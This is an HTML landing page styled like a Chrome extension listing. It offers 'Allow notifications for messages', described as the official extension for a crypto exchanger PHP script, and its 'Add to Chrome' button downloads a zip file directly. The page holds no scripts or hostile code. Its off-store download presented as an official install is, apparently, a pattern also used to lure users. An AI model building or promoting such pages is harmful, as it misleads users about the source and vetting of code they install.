<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Allow notifications for messages - Chrome Extension</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      height: 100vh;
      width: 100vw;
    }

    .container {
      max-width: 1000px;
      margin: auto;
      padding: 40px 20px;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
    }

    .info {
      flex: 1;
      margin-left: 20px;
    }

    .info h1 {
      font-size: 28px;
      margin-bottom: 10px;
    }

    .info p {
      color: #555;
      line-height: 1.5;
    }

    .icon {
      width: 120px;
      height: 120px;
      border-radius: 20px;
    }

    .add-button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      transition: background-color 0.2s ease;
    }

    .add-button:hover {
      background-color: #1669c1;
    }

    .previews {
      margin-top: 50px;
      display: flex;
      justify-content: center;
      gap: 30px;
      flex-wrap: wrap;
    }

    .previews img {
      width: 450px;
      max-width: 100%;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
      transition: transform 0.2s ease;
    }

    .previews img:hover {
      transform: scale(1.03);
    }

    @media (max-width: 768px) {
      .header {
        flex-direction: column;
        align-items: center;
        text-align: center;
      }

      .info {
        margin-left: 0;
      }

      .previews {
        flex-direction: column;
        gap: 20px;
      }

      .previews img {
        width: 90%;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="header">
      <img src="icon.png" alt="Extension Icon" class="icon">
      <div class="info">
        <h1>Allow notifications for messages</h1>
        <p>The official Chrome extension for receiving message alerts from the Crypto Exchanger PHP script.</p>
        <a href="Allow-notifications.zip" download>
          <button class="add-button">Add to Chrome</button>
        </a>
      </div>
    </div>

    <div class="previews">
      <img src="preview1.png" alt="Preview 1">
      <img src="preview2.png" alt="Preview 2">
    </div>
  </div>

</body>
</html>
